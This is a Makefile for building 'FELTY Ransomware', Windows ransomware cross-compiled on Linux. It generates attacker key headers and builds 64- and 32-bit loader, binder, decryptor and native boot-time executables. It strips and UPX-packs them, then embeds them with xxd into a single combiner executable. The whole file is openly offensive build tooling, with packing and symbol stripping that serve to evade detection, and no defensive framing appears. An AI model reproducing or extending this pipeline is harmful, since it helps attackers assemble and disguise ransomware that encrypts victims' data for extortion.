# ============================================================
#  FELTY Ransomware Build System (Linux cross‑compile to Win)
# ============================================================

CC64 = x86_64-w64-mingw32-gcc
CC32 = i686-w64-mingw32-gcc
STRIP = strip
UPX   = upx
XXD   = xxd
PY    = python3

CFLAGS_BASE = -Os -s -Wall
LFLAGS64 = -lcrypt32 -ladvapi32 -lgdi32 -luser32 -lnetapi32
LFLAGS32 = $(LFLAGS64)
WINFLAGS = -mwindows

SRC_LOADER   = felty_loader.c
SRC_BINDER   = felty_binder.c
SRC_DECRYPT  = felty_decrypt.c
SRC_BOOT     = felty_boot.c
SRC_COMBINER = combiner.c

KEYGEN_OUT = attacker_pubkey.h
X64DIR = x64
WIN32DIR = win32

.PHONY: all clean combine combine_x64 combine_win32

# Default builds everything except the combiner (combine is separate)
all: dirs keygen x64 win32

dirs:
	mkdir -p $(X64DIR) $(WIN32DIR)

keygen: $(KEYGEN_OUT)

$(KEYGEN_OUT): felty_keygen.py
	@echo "[*] Generating attacker keys..."
	$(PY) felty_keygen.py

# ================== 64-bit Binaries ==================
x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(X64DIR)/felty_boot.exe

$(X64DIR)/felty_loader.exe: $(SRC_LOADER) $(KEYGEN_OUT) | $(X64DIR)
	$(CC64) $(CFLAGS_BASE) -o $@ $< $(LFLAGS64) $(WINFLAGS)
	$(STRIP) --strip-all $@
	-$(UPX) --best $@ 2>/dev/null || true

$(X64DIR)/felty_binder.exe: $(SRC_BINDER) $(KEYGEN_OUT) | $(X64DIR)
	$(CC64) $(CFLAGS_BASE) -o $@ $< $(LFLAGS64) $(WINFLAGS)
	$(STRIP) --strip-all $@

$(X64DIR)/felty_decrypt.exe: $(SRC_DECRYPT) $(KEYGEN_OUT) | $(X64DIR)
	$(CC64) $(CFLAGS_BASE) -municode -o $@ $< -lcrypt32 -ladvapi32
	$(STRIP) --strip-all $@

$(X64DIR)/felty_boot.exe: $(SRC_BOOT) | $(X64DIR)
	$(CC64) $(CFLAGS_BASE) -nostdlib -Wl,--subsystem,native -e NtProcessStartup -o $@ $< -lntdll
	$(STRIP) --strip-all $@

# ================== 32-bit Binaries ==================
win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe $(WIN32DIR)/felty_boot.exe

$(WIN32DIR)/felty_loader.exe: $(SRC_LOADER) $(KEYGEN_OUT) | $(WIN32DIR)
	$(CC32) $(CFLAGS_BASE) -o $@ $< $(LFLAGS32) $(WINFLAGS)
	$(STRIP) --strip-all $@
	-$(UPX) --best $@ 2>/dev/null || true

$(WIN32DIR)/felty_binder.exe: $(SRC_BINDER) $(KEYGEN_OUT) | $(WIN32DIR)
	$(CC32) $(CFLAGS_BASE) -o $@ $< $(LFLAGS32) $(WINFLAGS)
	$(STRIP) --strip-all $@

$(WIN32DIR)/felty_decrypt.exe: $(SRC_DECRYPT) $(KEYGEN_OUT) | $(WIN32DIR)
	$(CC32) $(CFLAGS_BASE) -municode -o $@ $< -lcrypt32 -ladvapi32
	$(STRIP) --strip-all $@

$(WIN32DIR)/felty_boot.exe: $(SRC_BOOT) | $(WIN32DIR)
	$(CC32) $(CFLAGS_BASE) -nostdlib -Wl,--subsystem,native -e _NtProcessStartup@4 -o $@ $< -lntdll
	$(STRIP) --strip-all $@

# ================== Combiner (single EXE) ==================
combine: combine_x64 combine_win32

combine_x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(SRC_COMBINER)
	@echo "[*] Building 64-bit combiner..."
	$(XXD) -i $(X64DIR)/felty_loader.exe > felty_loader_exe.h
	$(XXD) -i $(X64DIR)/felty_binder.exe > felty_binder_exe.h
	$(XXD) -i $(X64DIR)/felty_decrypt.exe > felty_decrypt_exe.h
	$(CC64) $(CFLAGS_BASE) -o $(X64DIR)/combiner.exe $(SRC_COMBINER) $(WINFLAGS) -l shell32 \
	    -I. -include felty_loader_exe.h -include felty_binder_exe.h -include felty_decrypt_exe.h \
	    -DFELTY_USE_X64_NAMES
	$(STRIP) --strip-all $(X64DIR)/combiner.exe
	@echo "[+] Built: $(X64DIR)/combiner.exe"

combine_win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe $(SRC_COMBINER)
	@echo "[*] Building 32-bit combiner..."
	$(XXD) -i $(WIN32DIR)/felty_loader.exe > felty_loader_exe.h
	$(XXD) -i $(WIN32DIR)/felty_binder.exe > felty_binder_exe.h
	$(XXD) -i $(WIN32DIR)/felty_decrypt.exe > felty_decrypt_exe.h
	$(CC32) $(CFLAGS_BASE) -o $(WIN32DIR)/combiner.exe $(SRC_COMBINER) $(WINFLAGS) -l shell32 \
	    -I. -include felty_loader_exe.h -include felty_binder_exe.h -include felty_decrypt_exe.h \
	    -DFELTY_USE_WIN32_NAMES
	$(STRIP) --strip-all $(WIN32DIR)/combiner.exe
	@echo "[+] Built: $(WIN32DIR)/combiner.exe"

# ================== Clean ==================
clean:
	rm -rf $(X64DIR) $(WIN32DIR) *.exe $(KEYGEN_OUT) felty_loader_exe.h felty_binder_exe.h felty_decrypt_exe.h *.o
	@echo "[*] Cleaned."
